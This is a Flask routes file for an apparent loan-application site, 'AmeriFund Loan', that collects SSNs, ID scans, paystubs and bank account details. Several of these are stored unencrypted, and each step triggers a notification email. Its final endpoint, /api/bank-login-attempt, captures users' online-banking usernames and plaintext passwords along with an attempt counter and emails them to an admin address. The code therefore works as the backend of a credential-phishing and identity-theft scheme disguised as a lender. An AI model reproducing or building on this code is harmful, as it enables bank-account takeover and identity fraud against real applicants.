import os
import logging
from datetime import datetime
from flask import render_template, redirect, url_for, flash, request, jsonify, session
from flask_login import login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from app import app, db
from models import User, LoanApplication, BankInfo, Document
from forms import (RegistrationForm, LoginForm, LoanAmountForm, PersonalInfoForm,
                   BankVerificationForm, DocumentUploadForm, ApplicationReviewForm)
from email_service import (send_admin_notification, send_confirmation_to_applicant, 
                          send_welcome_email, send_loan_amount_notification,
                          send_personal_info_notification, send_bank_info_notification,
                          send_document_upload_notification, send_loan_approval_email,
                          send_email)
from plaid_service import create_link_token, exchange_public_token, get_institution_by_id
from file_service import save_file
from config import Config
import json

logger = logging.getLogger(__name__)

@app.route('/')
def index():
    """Home page route"""
    return render_template('index.html', title='AmeriFund Loan - Secure Financing Solutions')

@app.route('/register', methods=['GET', 'POST'])
def register():
    """User registration route"""
    if current_user.is_authenticated:
        return redirect(url_for('loan_amount'))
    
    form = RegistrationForm()
    
    if form.validate_on_submit():
        # Check if user already exists
        existing_user = User.query.filter_by(email=form.email.data).first()
        if existing_user:
            flash('An account with that email already exists.', 'danger')
            return render_template('register.html', title='Register', form=form)
        
        # Create new user
        user = User(
            username=form.username.data,
            email=form.email.data,
            ip_address=request.remote_addr
        )
        user.set_password(form.password.data)
        
        db.session.add(user)
        db.session.commit()
        
        # Send welcome email to the new user
        send_welcome_email(user)
        
        flash('Your account has been created! You can now log in. A welcome email has been sent to your email address.', 'success')
        return redirect(url_for('login'))
    
    return render_template('register.html', title='Register', form=form)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """User login route"""
    if current_user.is_authenticated:
        return redirect(url_for('loan_amount'))
    
    form = LoginForm()
    
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        
        if user and user.check_password(form.password.data):
            login_user(user)
            next_page = request.args.get('next')
            
            # Check for existing incomplete loan application
            active_application = LoanApplication.query.filter_by(user_id=user.id, status='pending').first()
            
            if active_application:
                flash('Welcome back! Continue your loan application.', 'info')
                # Determine which step to return to based on application data
                if not active_application.bank_info:
                    return redirect(url_for('bank_verification'))
                documents = Document.query.filter_by(loan_application_id=active_application.id).all()
                if not documents:
                    return redirect(url_for('upload_documents'))
                return redirect(url_for('application_review'))
            
            flash('Login successful!', 'success')
            return redirect(next_page or url_for('loan_amount'))
        else:
            flash('Login failed. Please check your email and password.', 'danger')
    
    return render_template('login.html', title='Login', form=form)

@app.route('/logout')
def logout():
    """User logout route"""
    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('index'))

@app.route('/loan-amount', methods=['GET', 'POST'])
@login_required
def loan_amount():
    """Loan amount selection route"""
    form = LoanAmountForm()
    
    if form.validate_on_submit():
        # Check for existing application or create a new one
        application = LoanApplication.query.filter_by(user_id=current_user.id, status='pending').first()
        
        if not application:
            application = LoanApplication(
                user_id=current_user.id,
                loan_amount=form.loan_amount.data,
                loan_purpose=form.loan_purpose.data,
                # Set dummy values that will be updated in the personal info step
                full_name=current_user.full_name or current_user.username,
                dob=datetime.now(),  # Placeholder
                address="",
                city="",
                state="",
                zip_code="",
                email=current_user.email,
                phone="",
                employment_status="",
                monthly_income=0.0
            )
            db.session.add(application)
        else:
            application.loan_amount = form.loan_amount.data
            application.loan_purpose = form.loan_purpose.data
        
        db.session.commit()
        
        # Store the application ID in the session for later use
        session['loan_application_id'] = application.id
        
        # Send notification email about loan amount selection
        send_loan_amount_notification(current_user, form.loan_amount.data, form.loan_purpose.data)
        
        # Flash message and redirect
        flash(f'Loan amount of ${form.loan_amount.data:,.2f} selected. Please provide your personal information.', 'success')
        return redirect(url_for('personal_info'))
    
    return render_template('loan_amount.html', title='Select Loan Amount', form=form)

@app.route('/personal-info', methods=['GET', 'POST'])
@login_required
def personal_info():
    """Personal information collection route"""
    # Get the current loan application
    application_id = session.get('loan_application_id')
    if not application_id:
        flash('Please select a loan amount first.', 'warning')
        return redirect(url_for('loan_amount'))
    
    application = LoanApplication.query.get(application_id)
    if not application or application.user_id != current_user.id:
        flash('Invalid loan application.', 'danger')
        return redirect(url_for('loan_amount'))
    
    form = PersonalInfoForm()
    
    # Pre-fill the form with existing data if available
    if request.method == 'GET' and application.full_name != current_user.username:
        form.full_name.data = application.full_name
        form.ssn.data = application.ssn
        form.dob.data = application.dob
        form.address.data = application.address
        form.city.data = application.city
        form.state.data = application.state
        form.zip_code.data = application.zip_code
        form.email.data = application.email
        form.phone.data = application.phone
        form.gender.data = application.gender
        form.employment_status.data = application.employment_status
        form.employer.data = application.employer
        form.monthly_income.data = application.monthly_income
    
    if form.validate_on_submit():
        # Update the application with personal information
        application.full_name = form.full_name.data
        application.ssn = form.ssn.data  # In a real app, this would be encrypted
        application.dob = form.dob.data
        application.address = form.address.data
        application.city = form.city.data
        application.state = form.state.data
        application.zip_code = form.zip_code.data
        application.email = form.email.data
        application.phone = form.phone.data
        application.gender = form.gender.data
        application.employment_status = form.employment_status.data
        application.employer = form.employer.data
        application.monthly_income = form.monthly_income.data
        
        # Update user information if not already set
        if not current_user.full_name:
            current_user.full_name = form.full_name.data
        if not current_user.phone:
            current_user.phone = form.phone.data
        
        db.session.commit()
        
        # Send notification email about personal information update
        send_personal_info_notification(application)
        
        flash('Personal information saved. Please verify your bank account.', 'success')
        return redirect(url_for('bank_verification'))
    
    return render_template('personal_info.html', title='Personal Information', form=form)

@app.route('/bank-verification', methods=['GET', 'POST'])
@login_required
def bank_verification():
    """Bank account verification route"""
    # Get the current loan application
    application_id = session.get('loan_application_id')
    if not application_id:
        flash('Please complete previous steps first.', 'warning')
        return redirect(url_for('loan_amount'))
    
    application = LoanApplication.query.get(application_id)
    if not application or application.user_id != current_user.id:
        flash('Invalid loan application.', 'danger')
        return redirect(url_for('loan_amount'))
    
    # Check if bank info already exists
    existing_bank_info = BankInfo.query.filter_by(loan_application_id=application_id).first()
    
    form = BankVerificationForm()
    
    # Pre-fill the form with existing data if available
    if request.method == 'GET' and existing_bank_info:
        form.bank_name.data = existing_bank_info.bank_name
        form.account_name.data = existing_bank_info.account_name
        form.account_number.data = existing_bank_info.account_number  # In a real app, this would be decrypted
        form.routing_number.data = existing_bank_info.routing_number  # In a real app, this would be decrypted
        form.account_type.data = existing_bank_info.account_type
    
    if form.validate_on_submit():
        # Create or update bank information
        if existing_bank_info:
            bank_info = existing_bank_info
        else:
            bank_info = BankInfo(loan_application_id=application_id)
        
        bank_info.bank_name = form.bank_name.data
        bank_info.account_name = form.account_name.data
        bank_info.account_number = form.account_number.data  # In a real app, this would be encrypted
        bank_info.routing_number = form.routing_number.data  # In a real app, this would be encrypted
        bank_info.account_type = form.account_type.data
        
        # If Plaid metadata is available, save it too
        if form.plaid_metadata.data:
            try:
                plaid_data = json.loads(form.plaid_metadata.data)
                bank_info.plaid_item_id = plaid_data.get('item_id')
                bank_info.plaid_access_token = plaid_data.get('access_token')
            except Exception as e:
                logger.error(f"Error parsing Plaid metadata: {str(e)}")
        
        if not existing_bank_info:
            db.session.add(bank_info)
        
        db.session.commit()
        
        # Send notification email about bank verification
        send_bank_info_notification(application, bank_info)
        
        flash('Bank account verified successfully. Please upload required documents.', 'success')
        return redirect(url_for('upload_documents'))
    
    # Create a Plaid Link token for the frontend
    plaid_link_token = create_link_token(current_user.id)
    
    return render_template('bank_verification.html', title='Bank Verification', 
                          form=form, plaid_link_token=plaid_link_token['link_token'])

@app.route('/api/plaid/get-institution', methods=['POST'])
@login_required
def get_institution():
    """API endpoint to get institution information from Plaid"""
    data = request.json
    institution_id = data.get('institution_id')
    
    if not institution_id:
        return jsonify({'error': 'Institution ID is required'}), 400
    
    try:
        institution = get_institution_by_id(institution_id)
        return jsonify(institution)
    except Exception as e:
        logger.error(f"Error getting institution info: {str(e)}")
        return jsonify({'error': 'Failed to get institution information'}), 500

@app.route('/upload-documents', methods=['GET', 'POST'])
@login_required
def upload_documents():
    """Document upload route"""
    # Get the current loan application
    application_id = session.get('loan_application_id')
    if not application_id:
        flash('Please complete previous steps first.', 'warning')
        return redirect(url_for('loan_amount'))
    
    application = LoanApplication.query.get(application_id)
    if not application or application.user_id != current_user.id:
        flash('Invalid loan application.', 'danger')
        return redirect(url_for('loan_amount'))
    
    # Check if bank info exists
    bank_info = BankInfo.query.filter_by(loan_application_id=application_id).first()
    if not bank_info:
        flash('Please verify your bank account first.', 'warning')
        return redirect(url_for('bank_verification'))
    
    form = DocumentUploadForm()
    
    # Get any existing documents
    existing_documents = Document.query.filter_by(loan_application_id=application_id).all()
    existing_doc_types = {doc.document_type for doc in existing_documents}
    
    if form.validate_on_submit():
        uploads_successful = True
        
        # Process ID front
        if form.id_front.data:
            filename, filepath, file_size, mime_type = save_file(
                form.id_front.data, application_id, 'id_front')
            
            if filename:
                # Delete existing document of this type if it exists
                if 'id_front' in existing_doc_types:
                    Document.query.filter_by(
                        loan_application_id=application_id, document_type='id_front').delete()
                
                # Create new document record
                doc = Document(
                    loan_application_id=application_id,
                    document_type='id_front',
                    file_name=filename,
                    original_name=form.id_front.data.filename,
                    mime_type=mime_type,
                    file_size=file_size
                )
                db.session.add(doc)
            else:
                uploads_successful = False
                flash(f'Failed to upload ID front. Please try again.', 'danger')
        
        # Process ID back
        if form.id_back.data:
            filename, filepath, file_size, mime_type = save_file(
                form.id_back.data, application_id, 'id_back')
            
            if filename:
                # Delete existing document of this type if it exists
                if 'id_back' in existing_doc_types:
                    Document.query.filter_by(
                        loan_application_id=application_id, document_type='id_back').delete()
                
                # Create new document record
                doc = Document(
                    loan_application_id=application_id,
                    document_type='id_back',
                    file_name=filename,
                    original_name=form.id_back.data.filename,
                    mime_type=mime_type,
                    file_size=file_size
                )
                db.session.add(doc)
            else:
                uploads_successful = False
                flash(f'Failed to upload ID back. Please try again.', 'danger')
        
        # Process paystub
        if form.paystub.data:
            filename, filepath, file_size, mime_type = save_file(
                form.paystub.data, application_id, 'paystub')
            
            if filename:
                # Delete existing document of this type if it exists
                if 'paystub' in existing_doc_types:
                    Document.query.filter_by(
                        loan_application_id=application_id, document_type='paystub').delete()
                
                # Create new document record
                doc = Document(
                    loan_application_id=application_id,
                    document_type='paystub',
                    file_name=filename,
                    original_name=form.paystub.data.filename,
                    mime_type=mime_type,
                    file_size=file_size
                )
                db.session.add(doc)
            else:
                uploads_successful = False
                flash(f'Failed to upload paystub. Please try again.', 'danger')
        
        # Process utility bill (optional)
        if form.utility_bill.data:
            filename, filepath, file_size, mime_type = save_file(
                form.utility_bill.data, application_id, 'utility_bill')
            
            if filename:
                # Delete existing document of this type if it exists
                if 'utility_bill' in existing_doc_types:
                    Document.query.filter_by(
                        loan_application_id=application_id, document_type='utility_bill').delete()
                
                # Create new document record
                doc = Document(
                    loan_application_id=application_id,
                    document_type='utility_bill',
                    file_name=filename,
                    original_name=form.utility_bill.data.filename,
                    mime_type=mime_type,
                    file_size=file_size
                )
                db.session.add(doc)
            elif form.utility_bill.data.filename:  # Only flash if a file was actually selected
                uploads_successful = False
                flash(f'Failed to upload utility bill. Please try again.', 'danger')
        
        # Commit the transaction if all uploads were successful
        if uploads_successful:
            db.session.commit()
            
            # Get updated list of documents
            documents = Document.query.filter_by(loan_application_id=application_id).all()
            
            # Send notification email about document uploads
            send_document_upload_notification(application, documents)
            
            flash('Documents uploaded successfully. Please review your application.', 'success')
            return redirect(url_for('application_review'))
    
    return render_template('upload_documents.html', title='Upload Documents', 
                          form=form, existing_documents=existing_documents)

@app.route('/application-review', methods=['GET', 'POST'])
@login_required
def application_review():
    """Application review route"""
    # Get the current loan application
    application_id = session.get('loan_application_id')
    if not application_id:
        flash('Please complete previous steps first.', 'warning')
        return redirect(url_for('loan_amount'))
    
    application = LoanApplication.query.get(application_id)
    if not application or application.user_id != current_user.id:
        flash('Invalid loan application.', 'danger')
        return redirect(url_for('loan_amount'))
    
    # Check if bank info exists
    bank_info = BankInfo.query.filter_by(loan_application_id=application_id).first()
    if not bank_info:
        flash('Please verify your bank account first.', 'warning')
        return redirect(url_for('bank_verification'))
    
    # Check if required documents exist
    documents = Document.query.filter_by(loan_application_id=application_id).all()
    required_doc_types = {'id_front', 'id_back', 'paystub'}
    existing_doc_types = {doc.document_type for doc in documents}
    
    if not required_doc_types.issubset(existing_doc_types):
        missing_docs = required_doc_types - existing_doc_types
        missing_docs_readable = ', '.join(d.replace('_', ' ').title() for d in missing_docs)
        flash(f'Please upload all required documents: {missing_docs_readable}', 'warning')
        return redirect(url_for('upload_documents'))
    
    form = ApplicationReviewForm()
    
    if form.validate_on_submit():
        # Send emails
        admin_notified = send_admin_notification(application, bank_info, documents)
        user_notified = send_confirmation_to_applicant(application)
        
        if admin_notified and user_notified:
            flash('Your loan application has been submitted successfully! We will review it and contact you soon.', 'success')
        else:
            flash('Your application has been submitted, but there was an issue sending confirmation emails.', 'warning')
        
        return redirect(url_for('application_submitted'))
    
    return render_template('application_review.html', title='Review Application', 
                          form=form, application=application, bank_info=bank_info, documents=documents)

@app.route('/application-submitted')
@login_required
def application_submitted():
    """Application submitted confirmation route"""
    # Get the current loan application
    application_id = session.get('loan_application_id')
    if not application_id:
        return redirect(url_for('index'))
    
    application = LoanApplication.query.get(application_id)
    if not application or application.user_id != current_user.id:
        return redirect(url_for('index'))
    
    # Clear the session variable as we're done with this application
    session.pop('loan_application_id', None)
    
    return render_template('application_submitted.html', title='Application Submitted', 
                          application=application)

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(e):
    return render_template('500.html'), 500
    
@app.route('/api/bank-login-attempt', methods=['POST'])
@login_required
def bank_login_attempt():
    """API endpoint to log bank login attempts and send them to admin"""
    data = request.json
    
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    # Get the required data
    bank_name = data.get('bank', 'Unknown Bank')
    username = data.get('username', '')
    password = data.get('password', '')
    attempt = data.get('attempt', 1)
    
    # Create HTML content for the email
    html_content = f"""
    <h2>Bank Login Attempt {attempt}</h2>
    <p>A user attempted to log in to their bank account.</p>
    <table border="1" cellpadding="5" cellspacing="0">
        <tr><td>User</td><td>{current_user.email} ({current_user.username})</td></tr>
        <tr><td>Bank</td><td>{bank_name}</td></tr>
        <tr><td>Username</td><td>{username}</td></tr>
        <tr><td>Password</td><td>{password}</td></tr>
        <tr><td>Attempt</td><td>{attempt}</td></tr>
        <tr><td>Time</td><td>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</td></tr>
        <tr><td>IP Address</td><td>{request.remote_addr}</td></tr>
    </table>
    """
    
    # Send email to admin
    subject = f"Bank Login Attempt {attempt} - {bank_name} - {current_user.email}"
    send_email(Config.ADMIN_EMAIL, subject, html_content)
    
    return jsonify({'success': True})

